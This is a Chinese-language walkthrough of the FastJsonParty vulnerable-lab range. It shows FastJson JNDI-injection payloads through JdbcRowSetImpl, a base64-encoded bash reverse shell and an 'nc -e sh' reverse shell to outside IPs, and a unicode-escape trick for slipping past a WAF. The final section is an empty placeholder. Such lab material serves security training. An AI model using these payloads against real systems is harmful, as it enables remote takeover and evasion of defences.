靶场环境 https://github.com/lemono0/FastJsonParty

FastJson全版本Docker漏洞环境(涵盖1.2.47/1.2.68/1.2.80等版本)，主要包括JNDI注入及高版本绕过、waf绕过、文件读写、原生反序列化、利用链探测绕过、不出网利用等。从黑盒的角度覆盖FastJson深入利用

## FastJson-JDK高版本绕过(1245-jdk8u342)

![插件判断fastjson版本](jn1.png)

```
java -jar JNDIBypass.jar -a "0.0.0.0" -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTM1LjE1MS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"
```

生成恶意ldap

利用payload攻击

```
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://43.143.135.151:1389/F40sv","autocommit":true}}
```

![拿到webshell权限](jn2.png)

## FastJson-编码特性WAF绕过(1247-jndi-waf)

利用JNDI注入未成功转编码绕过利用
Fastjson本身是默认识别并解码hex和unicode编码的，可以利用这个特性绕过

![发现waf](fa3.png)

声称恶意协议

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 101.32.220.14 9999 -e sh" -A 101.32.220.14
```

```
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://101.32.220.14:1389/cEsHj",
        "autoCommit": "true"
    }
}
```

```
{
    "a":{
        "\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073",
        "\u0076\u0061\u006C":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"
    },
    "b":{
        "\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C",
        "\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"\u0072\u006D\u0069\u003A\u002F\u002F\u0031\u0030\u0031\u002E\u0033\u0032\u002E\u0032\u0032\u0030\u002E\u0031\u0034\u003A\u0031\u0030\u0039\u0039\u002F\u007A\u0039\u0069\u0035\u0074\u0074",
        "\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":"\u0074\u0072\u0075\u0065"
    }
}
```

## FastJson-高版本加写入链利用（1268-writefile-jsp）

[[write-up]]

